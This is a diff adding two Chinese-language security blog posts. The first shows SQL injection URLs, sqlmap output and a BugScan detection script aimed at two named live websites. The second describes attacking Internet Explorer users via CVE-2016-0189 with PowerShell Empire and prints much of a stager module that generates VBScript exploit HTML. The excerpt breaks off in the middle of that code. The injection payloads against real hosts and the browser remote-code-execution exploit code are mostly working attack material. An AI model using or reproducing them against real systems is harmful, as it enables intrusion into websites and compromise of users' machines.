@@ -296,6 +296,1383 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/BugScan插件编写/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="ZEROYU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ZEROYU">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/01/22/BugScan插件编写/" itemprop="url">
+                  BugScan插件编写
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:23:35+08:00">
+                2017-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/01/22/BugScan插件编写/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/BugScan插件编写/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/01/22/BugScan插件编写/" class="leancloud_visitors" data-flag-title="BugScan插件编写">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈……</p>
+<p>下面就让我们看看这个题目：</p>
+<p>某通用平台被曝出有一处高危注入，以下为详情：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span>www.exploit.com<span class="regexp">/livefiles/</span>pages<span class="regexp">/inner/u</span>serlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=<span class="number">1</span></div></pre></td></tr></table></figure>
+<p>userName处为一处报错注入，</p>
+<p>请使用python编写一个通用脚本检测该处注入点(可使用任何python库)，<br>要求测试该脚本必须使用多个目标站点。<br>以下为两个测试站点（请勿做除测试之外的任何危险动作）</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//www.jmsyzx.com/</span></div><div class="line"><span class="symbol">http:</span><span class="comment">//www.globechildren.com/</span></div></pre></td></tr></table></figure>
+<p>哎呦，不限制python库，一个通用脚本。刚跟室友开黑了一下守望先锋（挺好玩儿的，有兴趣一起啊）的我刚看也是一脸懵逼，总之刚开始想的太多了，但其实也就是一个插件的事情（还是range一棒打醒我，所以以后还是干完正事再开黑）。</p>
+<p>看了一下是mssql数据库，并且是报错注入。我们可以手工构造看数据库类型：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl<span class="number">00</span>_ctl<span class="number">00</span>_TemplateHolder_ContentHolder_ctl<span class="number">06</span>&amp;userName=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=@<span class="title">@version--</span></div></pre></td></tr></table></figure>
+<p>也可以sqlmap跑一下看看：</p>
+<figure class="highlight scheme"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">[<span class="name">22:07:32</span>] [<span class="name">INFO</span>] resuming back-end DBMS <span class="symbol">'microsoft</span> sql server'</div><div class="line">[<span class="name">22:07:32</span>] [<span class="name">INFO</span>] testing connection to the target URL</div><div class="line">sqlmap resumed the following injection point(<span class="name">s</span>) from stored session:</div><div class="line">---</div><div class="line">Parameter: userName (<span class="name">GET</span>)</div><div class="line">Type: error-based</div><div class="line">Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1' AND <span class="number">2390</span>=CONVERT(<span class="name">INT</span>,(<span class="name">SELECT</span> CHAR(<span class="name">113</span>)+CHAR(<span class="name">107</span>)+CHAR(<span class="name">98</span>)+CHAR(<span class="name">113</span>)+CHAR(<span class="name">113</span>)+(<span class="name">SELECT</span> (<span class="name">CASE</span> WHEN (<span class="name">2390=2390</span>) THEN CHAR(<span class="name">49</span>) ELSE CHAR(<span class="name">48</span>) END))+CHAR(<span class="name">113</span>)+CHAR(<span class="name">98</span>)+CHAR(<span class="name">112</span>)+CHAR(<span class="name">118</span>)+CHAR(<span class="name">113</span>))) AND <span class="symbol">'nTAv</span><span class="symbol">'=</span><span class="symbol">'nTAv</span></div><div class="line">Type: stacked queries</div><div class="line">Title: Microsoft SQL Server/Sybase stacked queries (<span class="name">comment</span>)</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1'<span class="comment">;WAITFOR DELAY '0:0:5'--</span></div><div class="line">Type: AND/OR time-based blind</div><div class="line">Title: Microsoft SQL Server/Sybase time-based blind (<span class="name">comment</span>)</div><div class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1' WAITFOR DELAY <span class="symbol">'0:0:5</span><span class="symbol">'--</span></div><div class="line">---</div><div class="line">[<span class="name">22:07:33</span>] [<span class="name">INFO</span>] the back-end DBMS is Microsoft SQL Server</div><div class="line">web server operating system: Windows <span class="number">2008</span> R2 or <span class="number">7</span></div><div class="line">web application technology: ASP.NET, Microsoft IIS <span class="number">7.5</span></div><div class="line">back-end DBMS: Microsoft SQL Server <span class="number">2005</span></div><div class="line">[<span class="name">22:07:33</span>] [<span class="name">INFO</span>] fetched data logged to text files under <span class="symbol">'C:</span>\Users\ZEROYU\.sqlmap\output\www.jmsyzx.com'</div></pre></td></tr></table></figure>
+<p>别多看看那个GET就行了，GET最简单了。<br>我们就抓住报错跟打印MD5这两点就行了。</p>
+<p>打印MD5呢，mssql有两种方式：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl<span class="number">00</span>_ctl<span class="number">00</span>_TemplateHolder_ContentHolder_ctl<span class="number">06</span>&amp;userName=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=sys.fn_sqlvarbasetostr(HashBytes(<span class="symbol">%27</span>MD<span class="number">5</span><span class="symbol">%27</span>,<span class="symbol">%27123456</span><span class="symbol">%27</span>))--</div><div class="line"></div><div class="line"><span class="number">2</span>.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl<span class="number">00</span>_ctl<span class="number">00</span>_TemplateHolder_ContentHolder_ctl<span class="number">06</span>&amp;userName=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=sys.fn_varbintohexstr(hashbytes(<span class="symbol">%27</span>MD<span class="number">5</span><span class="symbol">%27</span>,<span class="symbol">%271234</span><span class="symbol">%27</span>))--</div></pre></td></tr></table></figure>
+<p>直接上我写的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/evn python</span></div><div class="line"><span class="comment">#-*-:coding:utf-8 -*-</span></div><div class="line"><span class="string">"""</span></div><div class="line">POC Name : 泡妹专享</div><div class="line">Author : zeroyu</div><div class="line">mail : zeroyu.xyz@gmail.com</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> hackhttp</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, arg)</span>:</span></div><div class="line"><span class="keyword">if</span> service == <span class="string">'fingerprint.girl'</span>:</div><div class="line"><span class="keyword">return</span> <span class="keyword">True</span>, arg</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">audit</span><span class="params">(arg)</span>:</span></div><div class="line">payload = <span class="string">"/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--"</span></div><div class="line">url = arg + payload</div><div class="line">code, head, res, errcode, _ = hackhttp.http(url)</div><div class="line">time.sleep(<span class="number">1</span>)</div><div class="line"><span class="keyword">if</span> code == <span class="number">500</span> <span class="keyword">and</span> <span class="string">'81dc9bdb52d04dc20036dbd8313ed055'</span> <span class="keyword">in</span> res:</div><div class="line">security_hole(url)</div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line"><span class="keyword">from</span> dummy <span class="keyword">import</span> *</div><div class="line">audit(assign(<span class="string">'fingerprint.girl'</span>,<span class="string">'http://www.jmsyzx.com/'</span>)[<span class="number">1</span>])</div></pre></td></tr></table></figure>
+<p>是不是想问我hackhttp是个什么库，看<a href="http://doc.bugscan.net/" target="_blank" rel="external">文档</a>去。</p>
+<p>好，今天妹子就泡到这儿。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="ZEROYU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ZEROYU">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/" itemprop="url">
+                  POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:21:47+08:00">
+                2017-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/01/22/POWERSHELL-EMPIRE-CVE-2016-0189-PROFIT/" class="leancloud_visitors" data-flag-title="POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>​    Powershell Empire 是我们在渗透目标用户时一直都很喜欢的工具之一，虽然我们通常都是用Metaspolit和Empire来一起完成工作，使浏览器漏洞和经验结合在Empire中。<br>在最近的一次测试中我们没有选择去使用MSF，相反我们和一个新的“经验丰富”的Empire一起利用CVE-2016-0189（也就是vbscrupt_godmode）其攻击使用IE9—11的用户。Empire是近6个月来我们首选的使用并且最近开始打造漏洞工具箱。如果成功，powershell将会登录并通过一个代理链接到Empire。重要的是硬盘上不会留下任何信息。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> lib.common <span class="keyword">import</span> helpers</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stager</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, mainMenu, params=[])</span>:</span></div><div class="line"></div><div class="line">        self.info = &#123;</div><div class="line">            <span class="string">'Name'</span>: <span class="string">'MS16-051 IE RCE'</span>,</div><div class="line"></div><div class="line">            <span class="string">'Author'</span>: [<span class="string">'www.cgsec.co.uk'</span>],</div><div class="line"></div><div class="line">            <span class="string">'Description'</span>: (<span class="string">'Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which works on IE9/10/11 and all versions of Windows'</span>),</div><div class="line"></div><div class="line">            <span class="string">'Comments'</span>: [</div><div class="line">                <span class="string">'Target will have to open link with vulnerable version of IE.'</span></div><div class="line">            ]</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment"># any options needed by the stager, settable during runtime</span></div><div class="line">        self.options = &#123;</div><div class="line">            <span class="comment"># format:</span></div><div class="line">            <span class="comment">#   value_name : &#123;description, required, default_value&#125;</span></div><div class="line">            <span class="string">'Listener'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Listener to generate stager for.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">True</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">''</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'StagerRetries'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Times for the stager to retry connecting.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'0'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'OutFile'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'File to output HTML to, otherwise displayed on the screen.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">True</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">''</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'Base64'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Switch. Base64 encode the powershell output.'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">True</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'True'</span></div><div class="line">            &#125;,            </div><div class="line">            <span class="string">'UserAgent'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'User-agent string to use for the staging request (default, none, or other).'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'Proxy'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Proxy to use for request (default, none, or other).'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></div><div class="line">            &#125;,</div><div class="line">            <span class="string">'ProxyCreds'</span> : &#123;</div><div class="line">                <span class="string">'Description'</span>   :   <span class="string">'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).'</span>,</div><div class="line">                <span class="string">'Required'</span>      :   <span class="keyword">False</span>,</div><div class="line">                <span class="string">'Value'</span>         :   <span class="string">'default'</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment"># save off a copy of the mainMenu object to access external functionality</span></div><div class="line">        <span class="comment">#   like listeners/agent handlers/etc.</span></div><div class="line">        self.mainMenu = mainMenu</div><div class="line"></div><div class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> params:</div><div class="line">            <span class="comment"># parameter format is [Name, Value]</span></div><div class="line">            option, value = param</div><div class="line">            <span class="keyword">if</span> option <span class="keyword">in</span> self.options:</div><div class="line">                self.options[option][<span class="string">'Value'</span>] = value</div><div class="line"></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></div><div class="line"></div><div class="line">        <span class="comment"># extract all of our options</span></div><div class="line">        listenerName = self.options[<span class="string">'Listener'</span>][<span class="string">'Value'</span>]</div><div class="line">        base64 = self.options[<span class="string">'Base64'</span>][<span class="string">'Value'</span>]</div><div class="line">        userAgent = self.options[<span class="string">'UserAgent'</span>][<span class="string">'Value'</span>]</div><div class="line">        proxy = self.options[<span class="string">'Proxy'</span>][<span class="string">'Value'</span>]</div><div class="line">        proxyCreds = self.options[<span class="string">'ProxyCreds'</span>][<span class="string">'Value'</span>]</div><div class="line">        stagerRetries = self.options[<span class="string">'StagerRetries'</span>][<span class="string">'Value'</span>]</div><div class="line"></div><div class="line">        encode = <span class="keyword">False</span></div><div class="line">        <span class="keyword">if</span> base64.lower() == <span class="string">"true"</span>:</div><div class="line">            encode = <span class="keyword">True</span></div><div class="line"></div><div class="line">        <span class="comment"># generate the launcher code</span></div><div class="line">        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> launcher == <span class="string">""</span>:</div><div class="line">            <span class="keyword">print</span> helpers.color(<span class="string">"[!] Error in launcher command generation."</span>)</div><div class="line">            <span class="keyword">return</span> <span class="string">""</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">			code =  <span class="string">"&lt;html&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;head&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;meta http-equiv=\"x-ua-compatible\" content=\"IE=10\"&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;/head&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;body&gt;\n"</span></div><div class="line">			code += <span class="string">"    &lt;script type=\"text/vbscript\"&gt;\n"</span></div><div class="line">			code += <span class="string">"        Dim aw\n"</span></div><div class="line">			code += <span class="string">"        Dim plunge(32)\n"</span></div><div class="line">			code += <span class="string">"        Dim y(32)\n"</span></div><div class="line">			code += <span class="string">"        prefix = \"%u4141%u4141\"\n"</span></div><div class="line">			code += <span class="string">"        d = prefix &amp; \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n"</span></div><div class="line">			code += <span class="string">"        b = String(64000, \"D\")\n"</span></div><div class="line">			code += <span class="string">"        c = d &amp; b\n"</span></div><div class="line">			code += <span class="string">"        x = UnEscape(c)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Class ArrayWrapper\n"</span></div><div class="line">			code += <span class="string">"            Dim A()\n"</span></div><div class="line">			code += <span class="string">"            Private Sub Class_Initialize\n"</span></div><div class="line">			code += <span class="string">"                  ReDim Preserve A(1, 2000)\n"</span></div><div class="line">			code += <span class="string">"            End Sub\n"</span></div><div class="line">			code += <span class="string">"			\n"</span></div><div class="line">			code += <span class="string">"            Public Sub Resize()\n"</span></div><div class="line">			code += <span class="string">"                ReDim Preserve A(1, 1)\n"</span></div><div class="line">			code += <span class="string">"            End Sub\n"</span></div><div class="line">			code += <span class="string">"        End Class\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Class Dummy\n"</span></div><div class="line">			code += <span class="string">"        End Class\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Function getAddr (arg1, s)\n"</span></div><div class="line">			code += <span class="string">"            aw = Null\n"</span></div><div class="line">			code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            For i = 0 To 32\n"</span></div><div class="line">			code += <span class="string">"                Set plunge(i) = s\n"</span></div><div class="line">			code += <span class="string">"            Next\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            Set aw.A(arg1, 2) = s\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            Dim addr\n"</span></div><div class="line">			code += <span class="string">"            Dim i\n"</span></div><div class="line">			code += <span class="string">"            For i = 0 To 31\n"</span></div><div class="line">			code += <span class="string">"                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n"</span></div><div class="line">			code += <span class="string">"                   addr = strToInt(Mid(y(i), 3 + 4, 2))\n"</span></div><div class="line">			code += <span class="string">"                End If\n"</span></div><div class="line">			code += <span class="string">"                y(i) = Null\n"</span></div><div class="line">			code += <span class="string">"            Next\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            If addr = Null Then\n"</span></div><div class="line">			code += <span class="string">"                document.location.href = document.location.href\n"</span></div><div class="line">			code += <span class="string">"                Return\n"</span></div><div class="line">			code += <span class="string">"            End If\n"</span></div><div class="line">			code += <span class="string">"            getAddr = addr\n"</span></div><div class="line">			code += <span class="string">"        End Function\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Function leakMem (arg1, addr)\n"</span></div><div class="line">			code += <span class="string">"            d = prefix &amp; \"%u0008%u4141%u4141%u4141\"\n"</span></div><div class="line">			code += <span class="string">"            c = d &amp; intToStr(addr) &amp; b\n"</span></div><div class="line">			code += <span class="string">"            x = UnEscape(c)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            aw = Null\n"</span></div><div class="line">			code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            Dim o\n"</span></div><div class="line">			code += <span class="string">"            o = aw.A(arg1, 2)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            leakMem = o\n"</span></div><div class="line">			code += <span class="string">"        End Function\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Sub overwrite (arg1, addr)\n"</span></div><div class="line">			code += <span class="string">"            d = prefix &amp; \"%u400C%u0000%u0000%u0000\"\n"</span></div><div class="line">			code += <span class="string">"            c = d &amp; intToStr(addr) &amp; b\n"</span></div><div class="line">			code += <span class="string">"            x = UnEscape(c)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            aw = Null\n"</span></div><div class="line">			code += <span class="string">"            Set aw = New ArrayWrapper\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            aw.A(arg1, 2) = CSng(0)\n"</span></div><div class="line">			code += <span class="string">"        End Sub\n"</span></div><div class="line">			code += <span class="string">"		